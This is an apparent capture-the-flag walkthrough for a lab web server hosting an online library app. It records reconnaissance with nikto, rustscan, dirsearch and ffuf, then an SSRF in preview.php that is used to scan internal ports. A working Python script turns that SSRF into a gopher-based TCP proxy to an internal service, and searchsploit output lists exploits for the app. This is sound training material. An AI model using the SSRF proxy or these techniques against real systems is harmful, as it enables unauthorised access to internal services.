
<h3>Nikto</h3>

```bash
:~/Extract# nikto -h xx.xxx.xxx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.xxx
+ Target Hostname:    ip-xx-xxx-xxx-xxx.ec2.internal
+ Target Port:        80
+ Start Time:         2025-08-22 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-08-22 xx:xx:xx (GMT1) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h3>Nmap</h3>

```bash
:~/Extract# rustscan -a 10.201.114.233 --ulimit 5500 -- -A -Pn
...
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: TryBookMe - Online Library
```

<h3>Dirsearch</h3>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx
...
[xx:xx:xx] 301 -  321B  - /javascript  ->  http://xx.xxx.xxx.xxx/javascript/
[xx:xx:xx] 301 -  321B  - /management  ->  http://xx.xxx.xxx.xxx/management/
...
[xx:xx:xx] 301 -  314B  - /pdf  ->  http://xx.xxx.xxx.xxx/pdf/
```

<br>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx/management/

...
[xx:xx:xx] 302 -    0B  - /management/logout.php  ->  index.php
```

<br>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx/pdf/

...
```

<br>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx/javascript/

...
[xx:xx:xx] 301 -  328B  - /javascript/events  ->  http://xx.xxx.xxx.xxx/javascript/events/
```

<br>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx/javascript/events/

...
[xx:xx:xx] 200 -    4KB - /javascript/events/events
```

<h3>Web port 80</h3>

<img width="1154" height="325" alt="image" src="https://github.com/user-attachments/assets/73f121d0-f3f9-4743-9b53-355fdf94b8d9" />

<br>
<br>

```bash
Headers
GET http://xx.xxx.xxx.xxx/preview.php?url=http://cvssm1/pdf/lorem.pdf
```

```bash
http://xx.xxx.xxx.xxx/preview.php?url=http%3A%2F%2Fcvssm1%2Fpdf%2Florem.pdf
```
http://10.10.192.34/preview.php?url=http://127.0.0.1:10000/

```bash
:~/Extract# ffuf -u 'http://10.10.192.34/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0
...
80                      [Status: 200, Size: 1735, Words: 304, Lines: 65]
10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1]
```

<img width="1183" height="402" alt="image" src="https://github.com/user-attachments/assets/eebdd6e0-248a-42a3-8cbf-853f40f70640" />

<br>
<br>

<img width="1126" height="382" alt="image" src="https://github.com/user-attachments/assets/40c4f9be-a4b4-4ec9-8121-530f506cff98" />

<br>

<img width="1187" height="409" alt="image" src="https://github.com/user-attachments/assets/7691c521-93af-4027-ba74-ee379044aba9" />

<br>

#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.82.71"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()


<h3>Searchsploit</h3>

```bash
:~/Extract# searchsploit Online Library
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Library Management System 1.0 - 'Search' SQL Injection                                                                            | php/webapps/50053.txt
Online Library Management System 1.0 - Arbitrary File Upload                                                                             | php/webapps/48928.txt
Online Library Management System 1.0 - Arbitrary File Upload Remote Code Execution (Unauthenticated)                                     | php/webapps/50054.py
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
